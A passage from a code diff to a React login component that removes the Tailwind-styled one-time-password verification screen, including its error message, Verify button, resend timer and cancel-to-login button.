-                    className={`w-full h-[54px] sm:h-[56px] bg-white text-[#232042] text-[18px] sm:text-[22px] font-bold text-center tracking-[0.14em] sm:tracking-[0.18em] rounded-2xl border-2 outline-none transition-all px-4 placeholder:text-[#a0a5b5] placeholder:tracking-normal placeholder:font-normal placeholder:text-[14px] sm:placeholder:text-[15px] ${
-                      otpError
-                        ? "border-red-400 bg-red-50/20 focus:border-red-500 ring-2 ring-red-400/20"
-                        : "border-[#e2e4ec] focus:border-[#602bf8] focus:ring-4 focus:ring-[#602bf8]/15"
-                    }`}
-                  />
-                </div>
-              </div>
-
-              {/* OTP Error Message */}
-              {otpError && (
-                <p className="text-red-500 text-[13px] sm:text-[13.5px] font-medium mt-2.5 sm:mt-3 text-center px-2">
-                  {otpError}
-                </p>
-              )}
-
-              {/* Confirm / Verify Button */}
-              <button
-                type="submit"
-                disabled={otpLoading}
-                className="mt-6 sm:mt-8 w-full h-[52px] sm:h-[54px] rounded-full bg-[#602bf8] hover:bg-[#5321eb] active:scale-[0.99] text-white font-bold text-[15.5px] sm:text-[16px] flex items-center justify-center transition-all cursor-pointer disabled:opacity-75 disabled:cursor-not-allowed shadow-[0_2px_10px_rgba(96,43,248,0.2)]"
-              >
-                {otpLoading ? (
-                  <Loader2 className="w-5 h-5 animate-spin text-white" />
-                ) : (
-                  "Verify"
-                )}
-              </button>
-
-              {/* Resend Timer Section */}
-              <div className="flex flex-wrap items-center justify-center gap-1.5 mt-5 sm:mt-6 text-[13.5px] sm:text-[14px]">
-                <span className="text-[#767a89]">Didn't receive the code?</span>
-                {canResend ? (
-                  <button
-                    type="button"
-                    onClick={handleResendOtp}
-                    className="text-[#602bf8] font-bold hover:underline cursor-pointer flex items-center gap-1"
-                  >
-                    <RotateCcw className="w-3.5 h-3.5" />
-                    <span>Resend OTP</span>
-                  </button>
-                ) : (
-                  <span className="text-[#602bf8] font-semibold tabular-nums">
-                    Resend in {timer}s
-                  </span>
-                )}
-              </div>
-            </form>
-          </div>
-
-          {/* Cancel button */}
-          <div className="py-3 sm:py-4 text-center">
-            <button
-              type="button"
-              onClick={() => setCurrentStep("login")}
-              className="text-[#767a89] hover:text-[#232042] text-[13.5px] sm:text-[14px] font-medium transition-colors cursor-pointer"
-            >
-              Cancel and back to login
-            </button>
-          </div>
-        </div>
-      )}
-    </div>
-  );
+        </main>
+    )
 }
